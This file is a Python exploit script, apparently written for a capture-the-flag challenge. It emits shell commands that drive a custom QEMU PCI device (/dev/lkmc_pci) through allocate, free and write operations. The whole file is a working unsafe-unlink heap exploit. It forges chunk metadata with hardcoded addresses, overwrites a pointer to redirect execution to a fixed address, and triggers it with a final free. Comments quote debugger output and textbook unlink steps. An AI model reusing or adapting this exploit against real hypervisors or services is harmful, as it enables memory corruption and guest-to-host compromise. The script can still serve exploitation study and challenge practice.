#!/usr/bin/env python

import struct

def print_cmd(address, value):
    address /= 4
    packed = map(ord, struct.pack("<I", value))
    print("printf '\\x{0:02x}\\x{1:02x}\\x{2:02x}\\x{3:02x}' | dd bs=4 status=none of=/dev/lkmc_pci count=1 seek={4}".format(packed[0], packed[1], packed[2], packed[3], address))


def oo_alloc(bin, size):
    cmd = 0
    address  = 0
    address |= (cmd    & 0x00000F) << 20;
    address |= (bin    & 0x00000F) << 16;

    parsed_cmd = (0xF00000 & address) >> 20
    parsed_bin = (0x0F0000 & address) >> 16
    print("# cmd: {:x} (alloc), bin: {:x}, size: {:x}".format(parsed_cmd, parsed_bin, size))

    print_cmd(address, size/8)


def oo_free(bin):
    cmd = 1
    address  = 0
    address |= (cmd    & 0x00000F) << 20;
    address |= (bin    & 0x00000F) << 16;

    parsed_cmd = (0xF00000 & address) >> 20
    parsed_bin = (0x0F0000 & address) >> 16
    print("# cmd: {:x} (free), bin: {:x}".format(parsed_cmd, parsed_bin))

    print_cmd(address, 0)


def oo_write(bin, offset, value):
    cmd = 2
    address  = 0
    address |= (cmd    & 0x00000F) << 20;
    address |= (bin    & 0x00000F) << 16;
    address |= (offset & 0x00FFFF) << 0;

    parsed_cmd = (0xF00000 & address) >> 20
    parsed_bin = (0x0F0000 & address) >> 16
    offs = (0xFFFF & address)
    print("# cmd: {:x} (write), bin: {:x}, offset: {:x}, value: {:x}".format(parsed_cmd, parsed_bin, offs, value))


    print_cmd(address, value)


#pwndbg> p ooo->my_bufs[0]
#$2 = (uint8_t *) 0x7fffc85b4690 "x\a"
#pwndbg> p ooo->my_bufs[1]
#$3 = (uint8_t *) 0x7fffc8550650 "8\b"

header_sz = 2
malloc_sz = 0x80
chunk0_ptr_addr = 0x1317940
alloc_diff = 144

#start xpl

oo_alloc(0xF, malloc_sz) # ALLOC_ALL
oo_alloc(0xF, malloc_sz) # ALLOC_ALL
oo_alloc(0xF, malloc_sz) # ALLOC_ALL
oo_alloc(0xF, malloc_sz) # ALLOC_ALL

print("\n\n# CHECK IT OUT: the difference\n\n")

#	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
oo_write(0, 16, chunk0_ptr_addr - (8 * 3))
oo_write(0, 20, 0)
# 	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
oo_write(0, 24, chunk0_ptr_addr - (8 * 2))
oo_write(0, 28, 0)
#	chunk0_ptr[1] = sizeof(size_t);
oo_write(0, 8, 8)
oo_write(0, 12, 0)
#	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
chunk1_hdr_offset = alloc_diff - (header_sz * 8)
oo_write(0, chunk1_hdr_offset, malloc_sz)
oo_write(0, chunk1_hdr_offset + 4, 0)

#	chunk1_hdr[1] &= ~1;
# seems unneeded in this case?
print("\n\n# CHECK THE CHUNK1_HDR[1]\n\n")
oo_write(0, chunk1_hdr_offset + 8, 0x94)
oo_write(0, chunk1_hdr_offset + 12, 0)
print("\n\n# FREEING!\n\n")
oo_free (1)

# 	chunk0_ptr[3] = (uint64_t) victim_string;
oo_write(0, 3 * 8, 0x11301a0)
oo_write(0, (3 * 8) + 4, 0)

#	chunk0_ptr[0] = 0x4141414142424242LL;
oo_write(0, 0, 0x6e6605)
oo_write(0, 4, 0x0)

oo_free(0xc)
